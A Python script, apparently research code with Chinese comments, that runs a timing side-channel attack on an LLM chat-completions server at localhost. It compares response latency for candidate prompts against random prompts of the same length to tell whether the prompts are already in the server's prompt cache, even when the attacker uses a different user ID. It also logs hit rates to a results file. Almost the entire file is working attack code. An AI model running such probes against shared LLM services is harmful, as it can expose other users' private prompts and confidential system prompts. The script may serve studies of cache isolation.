import requests
import uuid
import json
import threading
import queue
import time
import random
import sys
from transformers import AutoTokenizer
import multiprocessing as mp
from load_requests import load_requests
import string

SERVER_URL = "http://127.0.0.1:8080/v1/chat/completions"
headers = {"Content-Type": "application/json"}

# === 攻击参数 ===
NUM_THREADS = 1          # 线程数
QPS_PER_THREAD = 1       # 每个线程的QPS
ISOLATION_MODE = True
BASE_REQUESTS_COUNT = 5  # 每次攻击前发送的基准请求数量 (2-5个)
LATENCY_THRESHOLD = 0.00004  # 检测阈值 (秒 per token) 

# === 每个线程对应一个Queue和Session ID ===
thread_queues = []
thread_session_ids = []

# === 攻击统计信息 ===
attack_results = {
    'total_attacks': 0,
    'successful_attacks': 0,
    'base_latencies': [],
    'test_latencies': [],
    'hit_detections': []
}

def generate_random_prompt(length):
    """生成指定长度的随机prompt"""
    # 使用字母、数字和常见标点符号
    chars = string.ascii_letters + string.digits + " .,!?;:"
    return ''.join(random.choice(chars) for _ in range(length))

def get_base_latency(prompt_length, user_id, model_name, num_requests=BASE_REQUESTS_COUNT):
    """获取指定长度prompt的基准延迟"""
    latencies = []
    
    for _ in range(num_requests):
        # 生成相同长度的随机prompt
        random_prompt = generate_random_prompt(prompt_length)
        
        payload = {
            "model": model_name,
            "messages": [
                {"role": "user", "content": random_prompt}
            ],
            "temperature": 0.0,
            "max_tokens": 1,
            "user_id": user_id,
        }
        
        start = time.perf_counter()
        response = requests.post(SERVER_URL, headers=headers, data=json.dumps(payload))
        end = time.perf_counter()
        
        if response.status_code == 200:
            latency = end - start
            latencies.append(latency)
            print(f"Base request latency: {latency:.4f}s")
        else:
            print(f"Base request failed with status: {response.status_code}")
    
    # 返回P50延迟
    sorted_latencies = sorted(latencies)
    p50_idx = int(0.5 * len(sorted_latencies))
    return sorted_latencies[p50_idx] if latencies else None

def perform_attack(attack_prompt, user_id, model_name):
    """执行单次攻击"""
    prompt_length = len(attack_prompt)
    
    # 1. 获取基准延迟
    print(f"\n=== Starting attack for prompt length {prompt_length} ===")
    base_latency = get_base_latency(prompt_length, user_id, model_name)
    
    if base_latency is None:
        print("Failed to get base latency, skipping attack")
        return False, None, None
    
    # 2. 发送攻击请求
    payload = {
        "model": model_name,
        "messages": [
            {"role": "user", "content": attack_prompt}
        ],
        "temperature": 0.0,
        "max_tokens": 1,
        "user_id": user_id,
    }
    
    start = time.perf_counter()
    response = requests.post(SERVER_URL, headers=headers, data=json.dumps(payload))
    end = time.perf_counter()
    
    if response.status_code == 200:
        test_latency = end - start
        print(f"Attack request latency: {test_latency:.4f}s")
        
        # 3. 判断是否命中
        latency_diff = base_latency - test_latency
        hit_detected = latency_diff > LATENCY_THRESHOLD * prompt_length
        
        print(f"Base latency: {base_latency:.4f}s")
        print(f"Test latency: {test_latency:.4f}s")
        print(f"Latency difference: {latency_diff:.4f}s")
        print(f"Threshold: {LATENCY_THRESHOLD * prompt_length}s")
        print(f"Hit detected: {hit_detected}")
        
        return hit_detected, base_latency, test_latency
    else:
        print(f"Attack request failed with status: {response.status_code}")
        return False, None, None

def shuffle_and_assign_requests(user_requests, num_threads):
    """将requests打乱后，均匀分配到每个thread的queue"""
    random.shuffle(user_requests)
    queues = [queue.Queue() for _ in range(num_threads)]
    for idx, req in enumerate(user_requests):
        queues[idx % num_threads].put(req)
    return queues

def worker(thread_id, user_id, req_queue, qps, model_name):
    """每个线程的攻击逻辑"""
    interval = 1.0 / qps  # 控制速率
    
    while True:
        try:
            attack_prompt = req_queue.get(timeout=5)
        except queue.Empty:
            print(f"[Thread {thread_id}] No more requests. Exiting.")
            break

        # 执行攻击
        hit_detected, base_latency, test_latency = perform_attack(attack_prompt, user_id, model_name)
        
        # 记录结果
        with threading.Lock():
            attack_results['total_attacks'] += 1
            if hit_detected:
                attack_results['successful_attacks'] += 1
            if base_latency is not None:
                attack_results['base_latencies'].append(base_latency)
            if test_latency is not None:
                attack_results['test_latencies'].append(test_latency)
            attack_results['hit_detections'].append(hit_detected)

        # 控制qps
        time.sleep(interval)

def report_attack_results():
    """报告攻击结果统计"""
    total_attacks = attack_results['total_attacks']
    successful_attacks = attack_results['successful_attacks']
    
    if total_attacks == 0:
        print("No attack data collected.")
        return
    
    success_rate = successful_attacks / total_attacks
    
    print("\n=== Side-Channel Attack Results ===")
    print(f"Total Attacks: {total_attacks}")
    print(f"Successful Attacks: {successful_attacks}")
    print(f"Success Rate: {success_rate:.2%}")
    
    if attack_results['base_latencies']:
        avg_base_latency = sum(attack_results['base_latencies']) / len(attack_results['base_latencies'])
        print(f"Average Base Latency: {avg_base_latency:.4f}s")
    
    if attack_results['test_latencies']:
        avg_test_latency = sum(attack_results['test_latencies']) / len(attack_results['test_latencies'])
        print(f"Average Test Latency: {avg_test_latency:.4f}s")
    
    print(f"Detection Threshold: {LATENCY_THRESHOLD}s per token")
    
    # 保存详细结果到文件
    results = {
        "attack_config": {
            "num_threads": NUM_THREADS,
            "qps_per_thread": QPS_PER_THREAD,
            "isolation_mode": ISOLATION_MODE,
            "base_requests_count": BASE_REQUESTS_COUNT,
            "latency_threshold": LATENCY_THRESHOLD
        },
        "attack_results": {
            "total_attacks": total_attacks,
            "successful_attacks": successful_attacks,
            "success_rate": success_rate,
            "base_latencies": attack_results['base_latencies'],
            "test_latencies": attack_results['test_latencies'],
            "hit_detections": attack_results['hit_detections']
        }
    }
    
    output_file = f"./results/side_channel_attack_results_{time.strftime('%Y%m%d_%H%M%S')}.json"
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2)
    
    print(f"\nDetailed results saved to: {output_file}")

if __name__ == "__main__":
    mp.set_start_method('spawn', force=True)
    model_name = "llama3-8b" 
    if len(sys.argv) > 1:
        model_name = sys.argv[1]
    file_name = "configurable-system-prompt-multitask.parquet"
    if len(sys.argv) > 2:
        file_name = sys.argv[2]
        
    local_path = {
        "llama3-8b": "../Models/Llama-3.2-8B",
        "qwen3-8b": "../Models/Qwen3-8B"
    }
    
    print("Loading tokenizer...")
    tokenizer = AutoTokenizer.from_pretrained(local_path[model_name])
    
    print("Loading attack requests...")
    user_requests = load_requests(
        file_name, 
        tokenizer, 
        max_embedding_positions=4090
    )
    sampled_requests = user_requests[0:2]
    random.shuffle(sampled_requests)
    
    # 提取prompts用于攻击
    attack_prompts = []
    for prompt, _, _, session_id in sampled_requests:
        attack_prompts.append(prompt)

    print(f"Loaded {len(attack_prompts)} attack prompts")
    print(f"Attack configuration:")
    print(f"  - Threads: {NUM_THREADS}")
    print(f"  - QPS per thread: {QPS_PER_THREAD}")
    print(f"  - Base requests per attack: {BASE_REQUESTS_COUNT}")
    print(f"  - Latency threshold: {LATENCY_THRESHOLD}s per token")
    print(f"  - Isolation mode: {ISOLATION_MODE}")

    # 1. 打乱并分配attack prompts到queues
    thread_queues = shuffle_and_assign_requests(attack_prompts, NUM_THREADS)

    # 2. 为每个线程分配一个session_id (攻击者使用不同的user_id)
    if not ISOLATION_MODE:
        thread_session_ids = [str(1) for _ in range(NUM_THREADS)]
    else:
        thread_session_ids = [str(uuid.uuid4()) for _ in range(NUM_THREADS)]

    # 3. 启动攻击线程
    threads = []
    for i in range(NUM_THREADS):
        t = threading.Thread(
            target=worker,
            args=(i, thread_session_ids[i], thread_queues[i], QPS_PER_THREAD, model_name)
        )
        t.start()
        threads.append(t)

    # 4. 等待所有线程完成
    for t in threads:
        t.join()

    # 5. 汇总攻击结果
    report_attack_results()